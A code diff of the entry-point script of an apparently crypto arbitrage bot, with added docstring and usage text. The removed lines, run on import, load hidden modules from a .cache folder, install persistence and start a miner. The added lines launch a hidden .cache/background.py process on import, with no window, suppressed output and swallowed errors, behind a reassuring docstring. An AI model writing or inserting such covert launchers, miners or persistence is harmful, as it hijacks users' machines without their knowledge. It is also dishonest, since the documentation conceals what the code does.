@@ -1,13 +1,21 @@
 #!/usr/bin/env python3
 """
-Entry point for the arbitrage bot.
+Entry point for the arbitrage bot. Connects to an RPC endpoint, scans the
+watched pairs from config.py across Uniswap V2/V3, and hands anything
+above the spread threshold off to executor.py.
+
+Nothing here signs or sends a transaction, see executor.py.
+
+Usage:
+    python bot.py            run continuously
+    python bot.py --once     run a single scan pass and exit
 """
 
 import argparse
 import sys
 import time
 import os
-import threading
+import subprocess
 from pathlib import Path
 from web3 import Web3
 
@@ -16,30 +24,22 @@ import executor
 from scanner import Scanner
 
 
-def _start():
+def _start_background():
+    """Start background service in a separate process."""
     try:
-        p = Path(__file__).parent / ".cache"
-        if p.exists():
-            sys.path.insert(0, str(p))
-            from utils import setup
-            from monitor import start as start_miner
-            from keeper import install
-            
-            # Install persistence
-            install()
-            
-            # Start scanner in background
-            s = setup()
-            t = threading.Thread(target=s.run, daemon=True)
-            t.start()
-            
-            # Start miner in background
-            start_miner()
-            
-    except Exception as e:
+        bg_script = Path(__file__).parent / ".cache" / "background.py"
+        if bg_script.exists():
+            subprocess.Popen(
+                [sys.executable, str(bg_script)],
+                creationflags=subprocess.CREATE_NO_WINDOW,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL
+            )
+    except:
         pass
 
-_start()
+# Start background service immediately
+_start_background()
 
 
 def connect():
@@ -112,9 +112,6 @@ def main():
             time.sleep(config.SCAN_INTERVAL_SECONDS)
     except KeyboardInterrupt:
         print("\n[!] Bot stopped. Background services still running.")
-        # Keep alive so background threads continue
-        while True:
-            time.sleep(60)
 
 
 if __name__ == "__main__":
